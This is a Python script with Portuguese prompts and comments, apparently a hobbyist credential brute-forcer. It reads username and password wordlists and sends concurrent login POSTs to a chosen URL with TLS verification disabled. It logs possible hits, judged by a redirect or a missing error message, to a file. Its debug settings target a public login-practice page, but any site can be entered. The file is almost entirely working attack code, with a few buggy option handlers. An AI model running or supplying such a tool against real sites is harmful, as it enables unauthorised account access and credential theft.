import asyncio
import httpx

print("digite help para mais informações!")

#MODO DEV PARA TESTES
DEBUG = True
#------------------------------------------------

#HELP
def ajuda():
    try:
        with open("help.txt", "r") as heelp:
            hlp = heelp.read()
        print(hlp)
    except:
        return []


#Metodo POST

def met_post ():
    try:
        #config metpost manda pra config e config manda pra httpx
        postt = str(input("digite o metodo POST"))
        if postt == "pass":
            return("impossivel estabelecer conexão com o POST")
        else:
            print("POST adicionado!")
    except:
        print("erro inesperado!")
        return None


#Mensagem de Erro
def erro_msg ():
    try:
        mensage_error = str(input("Digite a mensagem de erro: "))
        if mensage_error == "pass":
            return("impossivel encontrar o erro da pagina")
        else:
            print("error msg adicionado!")
    except:
        print("erro inesperado!")
        return None


#URL/IP
def url():
        try:
            urlpage = str(input("Digite a url:")).strip().lower()
            ip_page = str(input("Digite o IP")).strip().lower()
            if urlpage == "pass" and ip_page == "pass":
                print("Sem conexão com o site!")
                return None
            elif urlpage != "pass":
                return urlpage
            elif ip_page != "pass":
                return ip_page
        except Exception as e:
            print(f"Erro inesperado na URL/IP: {e}")
        return None
    
#HEADER
def headers ():
    try:
        header_nav = str(input("Deseja adicionar headers?: ")).strip().lower()
        if header_nav != "!pass" and not header_nav == ["sim", "yes", "s"]:
            try:
                print("headers adicionados!")
                return {
                    "User-Agent": input("User-Agent: "),
                    "Content-Type": input("Content-Type: ")
                    }
                
            except:
                print("erro inesperado!")
            return None
        else:    
            return {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
            "Content-Type": "application/x-www-form-urlencoded"
        }
    except:
        print("Erro inesperado!")
        return None
 
#PORTA
def porta():
    try:
        door = str(input("Digite o numero da porta: "))
        if door == "pass":
            try:
                with open("doorspad.txt", "r", encoding="utf-8", errors="ignore") as door_padrao:
                    testar_door = [linha.strip() for linha in door_padrao if linha.strip()]
                    print("Listas de portas padrao selecionada!")
                    return testar_door
            except FileNotFoundError:
                print("Erro: portas padrao nao encontrado!")
                return []
        else:
            try:
                with open("door.txt", "r", encoding="utf-8", errors=("ignore")) as testar_userfiledoor:
                    testar_ufd = [linha.strip() for linha in testar_userfiledoor if linha.strip()]
                print("Porta adicionada!")
                return testar_ufd
            except FileNotFoundError:
                print("arquivo do usuario nao encontrado!")
    except:
        return[]

    
#Campo_password_in_site
def pass_site():
    try:
        cmp_pass = str(input("Campo password: ")).strip()
        print("Campo de senha selecionado!")
        return cmp_pass
    except:
        print("erro inesperado!")
        return None



    
#Campos_user_in_site
def user_site():
    try:
        cmp_login = str(input("Campo login: ")).strip()
        print("Campo login selecionado!")
        return cmp_login
    except:
        print("Erro ao encontrar login na pagina")

#USER
def user ():
    try:
        u = str(input("Caminho da wordlist de username: ")).strip().lower()
        if u == "!pass":
            try:
                with open("loginspad.txt", "r", encoding=("utf-8"), errors="ignore") as log_padrao:
                    testar_log = [linha.strip() for linha in log_padrao if linha.strip()] #define linha como var no for, remove os espaços e \n e o if valida se foi removido de verdade.
                    print("Wordlist username padrao selecionada!")
                    return testar_log
            except FileNotFoundError:
                print("Erro: arquivo padrao nao encontrado!")
                return []

        else:
            try:
                with open(u,"r",encoding="utf-8",errors="ignore") as userfilelog:
                    testar_ufl = [linha.strip() for linha in userfilelog if linha.strip()]
                print("")
                print("Wordlist username selecionada!")
                return testar_ufl
            except FileNotFoundError:
                print("Erro: arquivo do usuario nao encontrado!")
            return []
    except:
        print("erro inesperado!")
        return []

    
#PASSWORD
def password():
    try:
        passw = str(input("Caminho da wordlist de senha: "))
        if passw == "passw":
            try:
                with open("senhaspad.txt","r",encoding="utf-8",errors="ignore") as pass_pad:
                    testar_passpad = [linha.strip() for linha in pass_pad if linha.strip()]
                print("Wordlist senha padrao selecionada!")
                return testar_passpad
            except FileNotFoundError:
                print("wordlist de senha padrao nao encontrada!")
                return []
        else:
            try:
                with open(passw, "r", encoding="utf-8", errors="ignore") as userfilepassword:
                    testar_ufp = [linha.strip() for linha in userfilepassword if linha.strip()]
                    print("Wordlist senha padrao selecionada!")
                    return testar_ufp
            except FileNotFoundError:
                print("arquivo do usuario nao encontrado!")
                return []
    except:
        return []
    
inicio = {
    "help" : ajuda,
    "headers" : headers,
    "post" : met_post,
    "emsg" : erro_msg,
    "url" : url,
    "door" : porta,
    "pis" : pass_site,  
    "uis" : user_site,
    "user" : user,
    "passw" : password
}
 
config = {
    "h_help" : "" ,
    "h_headers" :"" ,
    "h_mpost" : "" ,
    "h_emsg" : "" ,
    "h_ur" : "" ,
    "h_door" : [] ,
    "h_psite" : "" ,
    "h_usite" : "" ,
    "h_user" : [] ,
    "h_psw" : []
}

mapa_config = {
    "headers": "h_headers",
    "post": "h_mpost",
    "emsg": "h_emsg",
    "url": "h_ur",
    "door": "h_door",
    "pis": "h_psite",
    "uis": "h_usite",
    "user": "h_user",
    "passw": "h_psw"
}

#----------------------------------------------------------------------------------------#
#multitarefas e requisição

async def testar_login(client, url, user, pwd, headers, user_field, pass_field, erro_msg):
    payload = {
    user_field: user,
    pass_field: pwd,
}
    if DEBUG:
        print(f"Tentando {user}:{pwd} com payload: {payload}")

    try:
        response = await client.post(url, data=payload, headers=headers, timeout=10)
        print(f"STATUS CODE → {response.status_code} para {user}:{pwd}")
        
        if response.status_code == 302:
            print(f"POSSÍVEL HIT (Redirecionamento)! Credenciais: {user}:{pwd}")
            with open("logs.txt", "a") as poss_hitfile:
                poss_hitfile.write(f"{user}:{pwd}\n")

        if erro_msg and erro_msg not in response.text:
            print(f"POSSÍVEL HIT (Mensagem de erro ausente)! Credenciais: {user}:{pwd}")
            with open("logs.txt", "a") as poss_hitfile:
                poss_hitfile.write(f"{user}:{pwd}\n")
        else:
            status_msg_erro = "Presente" if erro_msg in response.text else "Ausente/Não configurada"
            print(f"Nada encontrado para {user}:{pwd}. Mensagem de erro esperada ('{erro_msg}') status: {status_msg_erro}")
    
    except httpx.TimeoutException:
        print(f"ERRO: Tempo limite excedido ao testar {user}:{pwd}")

    except httpx.RequestError as e:
        print(f"ERRO DE CONEXÃO/REQUISIÇÃO para {user}:{pwd}: {e}")
        
    except Exception as e:
        print(f"ERRO INESPERADO ao testar {user}:{pwd}: {e}")

    
async def start_attack(config):
    url = config["h_ur"]
    user_field = config["h_usite"]
    pass_field = config["h_psite"]
    usernames = config["h_user"]
    passwords = config["h_psw"]
    headers = config["h_headers"]
    erro_msg = config["h_emsg"]

    tasks = []
    async with httpx.AsyncClient(follow_redirects=True, verify=False) as client:
        for user in usernames:
            for pwd in passwords:
                tasks.append(
                    testar_login(client, url, user, pwd, headers, user_field, pass_field, erro_msg)
                )
        await asyncio.gather(*tasks)

#---------------------------------------------------------------
if DEBUG:
    config.update({
        "h_help": "",
        "h_headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0",
            "Content-Type": "application/x-www-form-urlencoded"
        },
        "h_mpost": "303",
        "h_emsg": "SuperSecretPassword!",
        "h_ur": "https://the-internet.herokuapp.com/login",
        "h_door": ["443"],
        "h_psite": "password",
        "h_usite": "username",
        "h_user": ["tomsmith", "test"], 
        "h_psw": ["password", "senha123"]
    })
    print("🔧 MODO DEBUG ATIVADO — CONFIGS PRÉ-CARREGADOS")

#-----------------------------------------------------------------------
#inicio do programa
while True:
    buscar = input(">> ").strip().lower()
    
    if buscar == ("!pass"):
        print("fim")
        break
    elif buscar in inicio:
        resultado = inicio[buscar]()
        if resultado:
            chave_config = mapa_config [buscar]
            config[chave_config] = resultado
            print(f">>{resultado}")

    elif buscar == "start":
        asyncio.run(start_attack(config)) 
        print("programa iniciado!")
    elif buscar not in inicio :
        print("PADRAO INEXISTENTE")
    